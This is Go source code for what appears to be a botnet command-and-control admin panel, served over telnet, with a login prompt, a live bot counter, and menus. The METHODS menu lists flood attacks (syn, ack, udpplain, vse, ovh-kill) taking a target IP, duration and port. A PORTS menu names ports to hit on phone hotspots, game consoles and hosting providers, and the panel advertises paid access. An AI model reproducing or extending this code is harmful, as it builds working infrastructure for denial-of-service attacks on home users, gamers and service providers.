package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
    "net/http"
	
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}


func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

      // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[4;32mимя пользователя\033[0;91m: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[4;36mпароль\033[0;91m: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

            time.Sleep(1 * time.Second)
            this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;37m[!] \033[0;32m%s \033[0;37myou have been logged in, sharing account info result in ban.\r\n\r\n", username)))
            
			

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;96mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;97mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95mпроверка учетных данных, пожалуйста, подождите.")))
    this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\x1b[32m                                                              \r\n"))
	this.conn.Write([]byte("\r\x1b[35m ██\033[33m╗    \033[01;35m██\033[33m╗\033[01;35m███████\033[33m╗\033[01;35m██\033[33m╗      \033[01;35m██████\033[33m╗ \033[01;35m██████\033[33m╗ \033[01;35m███\033[33m╗   \033[01;35m███\033[33m╗\033[01;35m███████\033[33m╗ \r\n"))
	this.conn.Write([]byte("\r\x1b[35m ██\033[33m║    \033[01;35m██\033[33m║\033[01;35m██\033[33m╔════╝\033[01;35m██\033[33m║     \033[01;35m██\033[33m╔════╝\033[01;35m██\033[33m╔═══\033[01;35m██╗\033[01;35m████\033[33m╗ \033[01;35m████\033[33m║\033[01;35m██\033[33m╔════ \r\n"))
	this.conn.Write([]byte("\r\x1b[35m ██\033[33m║\033[01;35m █\033[33m╗ \033[01;35m██\033[33m║\033[01;35m█████\033[33m╗  \033[01;35m██\033[33m║     \033[01;35m██\033[33m║     \033[01;35m██\033[33m║   \033[01;35m██\033[33m║\033[01;35m██\033[33m╔\033[01;35m████\033[33m╔\033[01;35m██\033[33m║\033[01;35m█████\033[33m╗ \r\n"))
	this.conn.Write([]byte("\r\x1b[35m ██\033[33m║\033[01;35m███\033[33m╗\033[01;35m██\033[33m║\033[01;35m██\033[33m╔══╝  \033[01;35m██\033[33m║     \033[01;35m██\033[33m║     \033[01;35m██\033[33m║   \033[01;35m██\033[33m║\033[01;35m██\033[33m║╚\033[01;35m██\033[33m╔╝\033[01;35m██\033[33m║\033[01;35m██\033[33m╔══\033[33m╝  \r\n"))
	this.conn.Write([]byte("\r\x1b[33m ╚\033[01;35m███\033[33m╔\033[01;35m███\033[33m╔╝\033[01;35m███████\033[33m╗\033[01;35m███████\033[33m╗╚\033[01;35m██████\033[33m╗╚\033[01;35m██████\033[33m╔╝\033[01;35m██\033[33m║\033[33m ╚═╝ \033[01;35m██\033[33m║\033[01;35m███████\033[33m╗ \r\n"))
	this.conn.Write([]byte("\r\x1b[33m  ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝\r\n"))
    time.Sleep(time.Duration(1500) * time.Millisecond) 
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[2J\033[1H"))
			    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1m \033[35m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

	this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[1;32mHey  \033[01;32m | \033[1;31m" + username + " !          \r\n")))
	
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mERROR: \033[01;37mWrong information!, \033[01;32mmessage me to buy @ryanlpz9,\033[01;35m	SHARING INFOMATION WILL RESULT IN A BAN!.    \033[01;39m  Your ip has been logged (: \r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
                      if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Loaded ▇ 🧎   | %s\007" , BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;91m[!] вы вошли в систему %s\r\n\r\n", username)))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;37m" + username + "\033[0;91m@\033[0;37mзапуск\033[0;91m:~\033[0;37m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        
if err != nil || cmd == "clear" || cmd == "cls" {
     this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m╗  \033[0;34m██\033[0;35m╗\033[0;34m███████\033[0;35m╗\033[0;34m██\033[0;35m╗     \033[0;34m██\033[0;35m╗ \033[0;34m██████\033[0;35m╗ \033[0;34m███████\033[0;35m╗\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m║  \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔════╝\033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔═══\033[0;34m██\033[0;35m╗\033[0;34m██\033[0;35m╔════╝\r\n"))
            this.conn.Write([]byte("                \033[0;34m███████\033[0;35m║\033[0;34m█████\033[0;35m╗  \033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m║   \033[0;34m██\033[0;35m║\033[0;34m███████\033[0;35m╗\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m╔══\033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔══╝  \033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m║   \033[0;34m██\033[0;35m║╚════\033[0;34m██\033[0;35m║\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m║  \033[0;34m██\033[0;35m║\033[0;34m███████\033[0;35m╗\033[0;34m███████\033[0;35m╗\033[0;34m██\033[0;35m║╚\033[0;34m██████\033[0;35m╔╝\033[0;34m███████\033[0;35m║\r\n"))
            this.conn.Write([]byte("                \033[0;35m╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚══════╝\r\n"))
			   continue
           

        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
		                   this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[32;1m \033[36m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
           			   this.conn.Write([]byte("\033[1;32m               -> ☢ Owner @Kingkilla ☢ <- \r\n"))
                       this.conn.Write([]byte("\033[01;31m     ╔══════════════════════════════════════╗   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mMETHODS -> \033[01;32mShows attack commands     \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;33m     ║ \033[01;33mBOTS -> \033[01;33mShows bots and archs         \033[01;33m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;34m     ║ \033[01;34mRULES -> \033[01;34mRead if you dont get banned \033[01;34m║   \033[0m \r\n"))
					   this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mPORTS -> \033[01;32mShows Ports To Attack With  \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;35m     ║ \033[01;35mCLS -> \033[01;35mClears the terminal           \033[01;35m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;36m     ║ \033[01;36mLOGOUT -> \033[01;36mExits from the terminal    \033[01;36m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;33m     ║ \033[01;33mTOOLS -> \033[01;33mShows a list of tools       \033[01;33m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;31m     ║ \033[01;31mBANNER -> \033[01;31mShows a list of banners    \033[01;31m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mOWNER  -> \033[01;32mShows Contact Page         \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;37m     ╚══════════════════════════════════════╝ \033[0m \r\n"))
        		continue
				}
				
        if err != nil || cmd == "TOOLS" || cmd == "tools" || cmd == "tool" { 
            this.conn.Write([]byte("\033[01;31m            ╔══════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[01;32m            ║\033[01;32m PING         - Pings an IP      \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;33m            ║\033[01;33m GEOIP        - Shows IP info    \033[01;33m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;35m PORTSCAN      - Port Scanner    \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;34m            ║\033[01;34m WHOIS       - Runs a WHOIS check\033[01;34m ║\r\n"))
            this.conn.Write([]byte("\033[01;35m            ║\033[01;35m TRACER    - Traceroute on IP    \033[01;35m ║\r\n"))
            this.conn.Write([]byte("\033[01;36m            ║\033[01;36m RESOLVE       - Resolves Domain \033[01;36m ║\r\n"))
            this.conn.Write([]byte("\033[1;95m            ║\033[01;37m REVDNS        - Shows DNS of IP \033[01;37m ║\r\n"))
            this.conn.Write([]byte("\033[01;38m            ║\033[01;38m ASNLOOKUP     - Shows ASN of IP \033[01;38m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;39m ANALYTICS     - Analytics Lookup\033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;31m            ║\033[01;34m SUBCALC      - Calculates Subnet\033[01;31m ║\r\n"))
            this.conn.Write([]byte("\033[01;32m            ║\033[01;32m ZTRANSF     - Shows ZoneTransfer\033[01;32m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;39m BANNERLOOKUP   - Banner Lookup  \033[01;32m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;35m HIDDEN   - Link Scraping tool   \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;33m            ╚══════════════════════════════════╝\r\n"))
            continue
        }
		        if err != nil || cmd == "PORTS" || cmd == "ports" {
          this.conn.Write([]byte("\033[0;31m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m HOTSPOT PORTS:                     VERIZON 4G LTE:                 \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m UDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m TCP - 2859, 5000                   TCP - 53                        \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;37m ║                                                                    \033[0;37m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots            \033[0;35m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port           \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;33m ║                                                                    \033[0;33m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m STANDARD PORTS:                                                    \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;31m ║\033[0;31m HOME: 80, 53, 22, 8080                                             \033[0;31m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m XBOX: 3074                                                         \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;33m ║\033[0;33m PS4: 9307                                                          \033[0;33m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m PS3:                                                               \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35m   TCP:3478, 3479, 3480, 5223                                       \033[0;35m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m   UDP:3478, 3479                                                   \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;37m ║\033[0;37m HOTSPOT: 9286                                                      \033[0;37m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m VPN: 7777                                                          \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m NFO: 1192                                                          \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35m OVH: 992                                                           \033[0;316m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m HTTP: 80, 8080,443                                                \033[0;37m ║\r\n"))
          this.conn.Write([]byte("\033[0;37m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
          continue
        }
        
        if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
                     this.conn.Write([]byte("\033[1;35m        -> | The Botnet Attack Methods | <- \r\n"))
			         this.conn.Write([]byte("\033[01;32m      ╔══════════════════════════════════════════════╗   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;31m      ║ \033[01;31mxmas     [\033[01;31mip\033[01;31m] [\033[01;31mtime\033[01;31m]\033[01;37m dport=[\033[01;31mport\033[01;37m]\033[01;31m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;32m      ║ \033[01;32m.        [\033[01;32mip\033[01;32m] [\033[01;32mtime\033[01;32m]\033[01;37m dport=[\033[01;32mport\033[01;37m]\033[01;32m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;33m      ║ \033[01;33mvse      [\033[01;33mip\033[01;33m] [\033[01;33mtime\033[01;33m]\033[01;37m dport=[\033[01;33mport\033[01;37m]\033[01;33m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;34m      ║ \033[01;34mraw      [\033[01;34mip\033[01;34m] [\033[01;34mtime\033[01;34m]\033[01;37m dport=[\033[01;34mport\033[01;37m]\033[01;34m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;37m      ║ \033[01;37mack      [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m]\033[01;37m dport=[\033[01;37mport\033[01;37m]\033[01;37m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;31m      ║ \033[01;31msyn      [\033[01;31mip\033[01;31m] [\033[01;31mtime\033[01;31m]\033[01;37m dport=[\033[01;31mport\033[01;37m]\033[01;31m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;32m      ║ \033[01;32mudpplain [\033[01;32mip\033[01;32m] [\033[01;32mtime\033[01;32m]\033[01;37m dport=[\033[01;32mport\033[01;37m]\033[01;32m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;35m      ║ \033[01;35movh-kill [\033[01;35mip\033[01;35m] [\033[01;35mtime\033[01;35m]\033[01;37m dport=[\033[01;35mport\033[01;37m]\033[01;35m            ║   \033[0m \r\n"))
			         this.conn.Write([]byte("\033[01;34m      ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
            continue
        }
						        if cmd == "owner" || cmd == "OWNER" || cmd == "?" { // display Contact Page
           			            this.conn.Write([]byte("\033[1;92m        -> | Contact Page | <- \r\n"))
            this.conn.Write([]byte("\033[1;35m             ╔══════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;91m             ║ \033[01;35m@Tzleq   ->   |     \033[01;35m->Instagram   \033[01;33m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;95m             ║ \033[01;32mKingkilla#3340 ->   |      \033[01;2m->Discord    \033[01;33m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;92m             ╚══════════════════════════════════════╝ \033[0m \r\n"))
        		continue
				}
			if err != nil || cmd == "BALLPIT" || cmd == "ballpit" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[2J\033[1H"))			
			this.conn.Write([]byte("\r\033[31;1m*****************************************\r\n"))
	this.conn.Write([]byte("\r\033[31;1m*        WELCOME TO THE BALL PIT        *\r\n"))
	this.conn.Write([]byte("\r\033[31;1m*     Now with \033[36;1mrefrigerator\x1b[31m support     *\r\n"))
	this.conn.Write([]byte("\r\033[31;1m*****************************************\r\n"))
	this.conn.Write([]byte("\r\n"))
	 continue

	}
			if cmd == "GOOGLE" || cmd == "google" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\x1b[32m                               ,,      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m   .g8'''bgd                               \x1b[32m`7MM      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m .dP'     `M                                 \x1b[32mMM      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m dM'       `   \x1b[31m,pW'Wq.   \x1b[33m,pW'Wq.   \x1b[34m.P'Ybmmm  \x1b[32mMM  \x1b[31m.gP'Ya      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m MM           \x1b[31m6W'   `Wb \x1b[33m6W'   `Wb \x1b[34m:MI  I8    \x1b[32mMM \x1b[31m,M'   Yb      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m MM.    `7MMF'\x1b[31m8M     M8 \x1b[33m8M     M8  \x1b[34mWmmmP'    \x1b[32mMM \x1b[31m8M''''''      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m `Mb.     MM  \x1b[31mYA.   ,A9 \x1b[33mYA.   ,A9 \x1b[34m8M         \x1b[32mMM \x1b[31mYM.    ,      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m   `'bmmmdPY   \x1b[31m`Ybmd9'   \x1b[33m`Ybmd9'   \x1b[34mYMMMMMb \x1b[32m.JMML.\x1b[31m`Mbmmd'      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m                         6'     dP      \r\n"))
	this.conn.Write([]byte("\r\x1b[34m                          Ybmmmd'      \r\n"))
			continue
		}
	
		if err != nil || cmd == "KILLER" || cmd == "killer" {
            this.conn.Write([]byte("\033[2J\033[1;1H")) 
            this.conn.Write([]byte("\x1b[0;97mLoading the \x1b[0;91mBotnet\x1b[0;97m KILLER\r\n"))
            time.Sleep(time.Duration(2000) * time.Millisecond)
            this.conn.Write([]byte("\x1b[0;97m Dropping \x1b[0;92mHelios \x1b[0;97min the wild\r\n"))
            time.Sleep(time.Duration(1500) * time.Millisecond)
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\x1b[0;97m Helios just killed your BINS using \x1b[0;91mHax\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        
        if cmd == "batkek" || cmd == "BATKEK" {
            this.conn.Write([]byte("\033[2J\033[1H"))
			    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1m ...\033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	       
	        this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╗  \033[91m█████\033[93m╗ \033[91m████████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m╗╚══\033[91m██\033[93m╔══╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\033[91m██\033[93m╔════╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m███████\033[93m║   \033[91m██\033[93m║   \033[91m█████\033[93m╔╝ \033[91m█████\033[93m╗  \033[91m█████\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m╔═\033[91m██\033[93m╗ \033[91m██\033[93m╔══╝  \033[91m██\033[93m╔═\033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m██\033[93m║  \033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m║  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m║  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[93m╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\r\n"))
            continue
        }
if err != nil || cmd == "HELIOS" || cmd == "helios" {
 this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m╗  \033[0;34m██\033[0;35m╗\033[0;34m███████\033[0;35m╗\033[0;34m██\033[0;35m╗     \033[0;34m██\033[0;35m╗ \033[0;34m██████\033[0;35m╗ \033[0;34m███████\033[0;35m╗\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m║  \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔════╝\033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔═══\033[0;34m██\033[0;35m╗\033[0;34m██\033[0;35m╔════╝\r\n"))
            this.conn.Write([]byte("                \033[0;34m███████\033[0;35m║\033[0;34m█████\033[0;35m╗  \033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m║   \033[0;34m██\033[0;35m║\033[0;34m███████\033[0;35m╗\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m╔══\033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m╔══╝  \033[0;34m██\033[0;35m║     \033[0;34m██\033[0;35m║\033[0;34m██\033[0;35m║   \033[0;34m██\033[0;35m║╚════\033[0;34m██\033[0;35m║\r\n"))
            this.conn.Write([]byte("                \033[0;34m██\033[0;35m║  \033[0;34m██\033[0;35m║\033[0;34m███████\033[0;35m╗\033[0;34m███████\033[0;35m╗\033[0;34m██\033[0;35m║╚\033[0;34m██████\033[0;35m╔╝\033[0;34m███████\033[0;35m║\r\n"))
            this.conn.Write([]byte("                \033[0;35m╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚══════╝\r\n"))
            continue
        }
		if cmd == "hakka" || cmd == "HAKKA" {
		    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\033[91m [+] DDOS | Succesfully hijacked connection\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[92m [+] DDOS | Masking connection from utmp+wtmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[93m [+] DDOS | Hiding from netstat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[94m [+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
        this.conn.Write([]byte(fmt.Sprintf("\033[95m [+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
    }
    this.conn.Write([]byte("\033[92m [+] DDOS | Setting up virtual terminal...\r\n"))
    time.Sleep(1 * time.Second)
		continue
		}
		
	


		
		              if cmd == "WOAH" || cmd == "woah" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;91m                         A Normal Day in the Life of a bin, infecting shitty telnets                                                                           \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]                                                                                              \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                                                                                             \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`                                                                                              \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                                                               \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                                                                                               \r\n"))
    time.Sleep(3 * time.Second)    
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                          A Wild dns just appeared, oh no its targeting the bin !!!                     \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                              ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                               \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                                \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                                  \033[33m                                '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____                  \033[33m                                 |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]                 \033[33m                                 (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                \033[33m                                 .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`                 \033[33m                                {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                 '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                  \033[33m                                   ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                  \033[33m                                                                        \r\n"))    
           time.Sleep(3 * time.Second)    
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
